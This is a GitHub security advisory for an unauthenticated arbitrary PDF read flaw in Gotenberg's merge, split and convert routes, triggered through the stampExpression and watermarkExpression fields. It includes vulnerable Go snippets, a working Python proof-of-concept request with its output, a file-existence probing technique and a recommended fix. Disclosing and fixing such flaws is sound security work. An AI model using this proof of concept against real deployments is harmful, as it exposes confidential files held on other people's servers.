# [M] Gotenberg has arbitrary PDF read via stampExpression and watermarkExpression in merge, split, and convert routes

## Summary
Severity: Medium
Advisory: GHSA-3cv5-q585-h563
CVE: CVE-2026-42593
CWE: CWE-22, CWE-73
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-3cv5-q585-h563
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0

## Details
## Summary

Six conversion routes (`pdfengines/merge`, `pdfengines/split`, `libreoffice/convert`, `chromium/convert/url`, `chromium/convert/html`, `chromium/convert/markdown`) accept `stampSource=pdf` + `stampExpression=/path` and `watermarkSource=pdf` + `watermarkExpression=/path` from anonymous callers. The dedicated stamp/watermark routes require an uploaded file when the source type is image or pdf; these six routes only overwrite the expression when a file is uploaded, leaving the user-controlled path intact when no file is attached. pdfcpu opens the path and composites its pages onto the output PDF, which returns to the caller. An attacker reads any PDF the Gotenberg process can access on the container filesystem.

## Details

The dedicated stamp route at `pkg/modules/pdfengines/routes.go:1322-1332` rejects requests missing the stamp file:

```go
if stamp.Source == gotenberg.StampSourceImage || stamp.Source == gotenberg.StampSourcePDF {
    if stampFile == "" {
        return api.WrapError(errors.New("no stamp file provided"), ...)
    }
    stamp.Expression = stampFile
}
```

The merge, split, LibreOffice, and Chromium routes use a lax pattern across twelve call sites (six stamp + six watermark):

```go
// pkg/modules/pdfengines/routes.go:679-683 (merge), 803 (split);
// pkg/modules/libreoffice/routes.go:307-311;
// pkg/modules/chromium/routes.go:433-438, 508-513, 592-597
if (stamp.Source == gotenberg.StampSourceImage || stamp.Source == gotenberg.StampSourcePDF) && stampFile != "" {
    stamp.Expression = stampFile
}
if (watermark.Source == gotenberg.StampSourceImage || watermark.Source == gotenberg.StampSourcePDF) && watermarkFile != "" {
    watermark.Expression = watermarkFile
}
```

When `stampFile == ""` (no file attached to the `stamp` form field), the guard short-circuits and `stamp.Expression` keeps the raw user-supplied `stampExpression` form string. The same pattern applies to `watermarkFile`/`watermarkExpression`.

`pkg/modules/pdfcpu/pdfcpu.go:635` forwards the expression straight to the pdfcpu CLI:

```go
args := []string{"stamp", "add", "-mode", "pdf", "--", stamp.Expression, onDesc, inputPath, outputPath}
cmd, err := gotenberg.CommandContext(ctx, logger, cfg.BinPath, args...)
```

pdfcpu reads the target PDF at that path and composites its pages as a stamp on every page of the merged output.

## Proof of Concept

Reproduction on the stock Docker image. The scenario models a deployment that mounts host paths into the container (common for document-processing pipelines) or where another request leaves a PDF in the shared `/tmp` filesystem:

```bash
docker run -d --name gotenberg-poc -p 3000:3000 gotenberg/gotenberg:8
docker exec gotenberg-poc sh -c 'cat > /tmp/victim_doc.pdf' < victim.pdf
```

Where `victim.pdf` contains extractable text such as `BOB-CONFIDENTIAL-CONTRACT-2026-04-20`.

Alice attacks without auth:

```python
import requests, io, subprocess
T = "http://localhost:3000"

minimal = (b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
           b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
           b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
           b"xref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n"
           b"0000000058 00000 n \n0000000115 00000 n \n"
           b"trailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n180\n%%EOF\n")

r = requests.post(
    f"{T}/forms/pdfengines/merge",
    files={"file1": ("a.pdf", io.BytesIO(minimal), "application/pdf"),
           "file2": ("b.pdf", io.BytesIO(minimal), "application/pdf")},
    data={"stampSource": "pdf", "stampExpression": "/tmp/victim_doc.pdf"},
    timeout=30,
)
print(f"HTTP {r.status_code} bytes={len(r.content)}")
open("/tmp/out.pdf", "wb").write(r.content)
print(subprocess.run(["pdftotext", "/tmp/out.pdf", "-"],
                     capture_output=True, text=True).stdout)
```

Observed output against gotenberg 8.31.0:

```
HTTP 200 bytes=1852
BOB-CONFIDENTIAL-CONTRACT-2026-04-20
...
```

Non-PDF targets via `stampSource=pdf` (for example `/etc/hostname`) return HTTP 500 after pdfcpu fails to parse the file as PDF, which acts as a file-existence oracle. `stampSource=image` with non-image files returns HTTP 400 (image parsing rejects it). The same PoC applies with `stampSource` replaced by `watermarkSource` and `stampExpression` by `watermarkExpression`.

## Impact

Any anonymous caller with access to port 3000 reads PDF files from any path the Gotenberg process can open. In the default Docker image with no volume mounts, the reachable set is limited to `/tmp/<gotenberg-work-uuid>/<request-uuid>/*.pdf` (files staged during another in-flight request) and any PDF files the base image happens to ship. In deployments that bind-mount host directories into the container (document processing pipelines, shared storage for Office document conversion), the attacker reads arbitrary PDF files under those mount points. The file-existence oracle additionally lets the attacker probe for the presence of non-PDF files anywhere the process can read.

## Recommended Fix

Apply the dedicated stamp route's guard to all six stamp call sites and all six watermark call sites:

```go
if stamp.Source == gotenberg.StampSourceImage || stamp.Source == gotenberg.StampSourcePDF {
    if stampFile == "" {
        return api.WrapError(
            errors.New("no stamp file provided for image or pdf source"),
            api.NewSentinelHttpError(http.StatusBadRequest,
                "Invalid form data: a stamp file is required for image or pdf source"),
        )
    }
    stamp.Expression = stampFile
}
if watermark.Source == gotenberg.StampSourceImage || watermark.Source == gotenberg.StampSourcePDF {
    if watermarkFile == "" {
        return api.WrapError(
            errors.New("no watermark file provided for image or pdf source"),
            api.NewSentinelHttpError(http.StatusBadRequest,
                "Invalid form data: a watermark file is required for image or pdf source"),
        )
    }
    watermark.Expression = watermarkFile
}
```

Call sites: `pkg/modules/pdfengines/routes.go:679-683` (merge), `:803-807` (split), `pkg/modules/libreoffice/routes.go:307-311`, `pkg/modules/chromium/routes.go:433-438` (url), `:508-513` (html), `:592-597` (markdown), plus each route's watermark counterpart.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-3cv5-q585-h563
- https://nvd.nist.gov/vuln/detail/CVE-2026-42593
- https://github.com/gotenberg/gotenberg
